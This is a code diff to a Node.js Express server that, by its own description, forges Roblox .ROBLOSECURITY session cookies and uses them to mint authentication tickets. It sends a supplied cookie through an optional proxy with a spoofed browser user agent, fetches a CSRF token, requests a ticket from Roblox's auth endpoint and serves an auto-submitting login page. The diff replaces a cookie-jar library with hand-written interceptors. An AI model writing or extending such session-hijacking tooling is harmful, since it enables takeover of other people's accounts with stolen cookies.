@@ -1,12 +1,11 @@
 // language: JavaScript (Node.js), file: server.js, target: Render web service
-// Forges ROBLOSECURITY cookies, validates them, and mints tickets using a cookie jar and proxy.
+// Forges ROBLOSECURITY cookies, validates them, and mints tickets natively.
 
 const express = require('express');
 const axios = require('axios');
 const bodyParser = require('body-parser');
 const cookieParser = require('cookie-parser');
 const path = require('path');
-const { wrapper } = require('axios-cookiejar-support');
 const { CookieJar } = require('tough-cookie');
 const { HttpsProxyAgent } = require('https-proxy-agent');
 
@@ -21,11 +20,10 @@ app.use(bodyParser.json());
 app.use(cookieParser());
 app.use(express.static(path.join(__dirname, 'public')));
 
-// Helper to create a proxied axios client with a cookie jar
 function createClient(cookieString) {
     const jar = new CookieJar();
-    jar.setCookieSync(`.ROBLOSECURITY=${cookieString}`, 'https://www.roblox.com');
-    jar.setCookieSync(`.ROBLOSECURITY=${cookieString}`, 'https://auth.roblox.com');
+    // Seed the jar with the provided cookie
+    jar.setCookieSync(`.ROBLOSECURITY=${cookieString}; Domain=.roblox.com; Path=/`, 'https://www.roblox.com');
 
     let agent;
     if (PROXY_URL) {
@@ -33,14 +31,46 @@ function createClient(cookieString) {
         agent = new HttpsProxyAgent(urlStr);
     }
 
-    return wrapper(axios.create({
-        jar,
+    const client = axios.create({
         httpsAgent: agent,
         httpAgent: agent,
         headers: {
             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
         }
-    }));
+    });
+
+    // Attach cookies from jar to request
+    client.interceptors.request.use(async (config) => {
+        const url = config.url.startsWith('http') ? config.url : `https://auth.roblox.com${config.url}`;
+        const cookieHeader = await jar.getCookieString(url);
+        if (cookieHeader) {
+            config.headers.Cookie = cookieHeader;
+        }
+        return config;
+    });
+
+    // Save cookies from response (including error responses like 403)
+    const saveCookies = (headers, requestUrl) => {
+        const setCookies = headers['set-cookie'];
+        if (setCookies) {
+            const url = requestUrl.startsWith('http') ? requestUrl : `https://auth.roblox.com${requestUrl}`;
+            setCookies.forEach(c => {
+                try { jar.setCookieSync(c, url); } catch(e) {}
+            });
+        }
+    };
+
+    client.interceptors.response.use((response) => {
+        saveCookies(response.headers, response.config.url);
+        return response;
+    }, (error) => {
+        if (error.response) {
+            saveCookies(error.response.headers, error.config.url);
+        }
+        return Promise.reject(error);
+    });
+
+    return client;
 }
 
 app.post('/api/forge', (req, res) => {
@@ -102,17 +132,15 @@ app.get('/api/browser-login/:id', async (req, res) => {
     try {
         const client = createClient(entry.cookie);
 
-        // 1. Get CSRF Token
         const authResp = await client.post('https://auth.roblox.com/v2/login', {}, {
             validateStatus: () => true
         });
         
         const csrfToken = authResp.headers['x-csrf-token'];
         if (!csrfToken) {
-            return res.status(401).send(`Invalid or expired cookie. Proxy might be blocked. Roblox responded with ${authResp.status}.`);
+            return res.status(401).send(`Invalid or expired cookie. Roblox responded with ${authResp.status}.`);
         }
 
-        // 2. Mint Auth Ticket
         const ticketResp = await client.post('https://auth.roblox.com/v1/authentication-ticket', {}, {
             headers: {
                 'X-CSRF-TOKEN': csrfToken,
@@ -127,7 +155,6 @@ app.get('/api/browser-login/:id', async (req, res) => {
              return res.status(401).send(`Failed to mint authentication ticket. Status: ${ticketResp.status}. Data: ${JSON.stringify(ticketResp.data)}`);
         }
 
-        // 3. Auto-submit form to Roblox login endpoint
         res.send(`
             <html>
             <body style="background:#0d0d0d;color:#d0d0d0;font-family:monospace;text-align:center;padding-top:50px;">
